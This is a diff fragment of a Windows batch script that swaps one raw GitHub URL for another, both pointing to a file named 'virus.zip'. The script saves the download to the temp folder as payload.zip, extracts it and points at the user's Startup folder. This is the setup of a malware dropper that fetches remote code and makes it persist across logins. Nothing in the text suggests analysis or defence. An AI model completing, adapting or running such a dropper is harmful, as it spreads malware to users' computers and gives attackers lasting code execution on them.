@@ -8,7 +8,7 @@ echo ============================================
 echo.
 
 :: === Raw GitHub link ===
-set "url=https://raw.githubusercontent.com/banzoxOG/test/main/virus.zip"
+set "url=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
 set "zipfile=%TEMP%\payload.zip"
 set "extractdir=%TEMP%\payload_extracted"
 set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
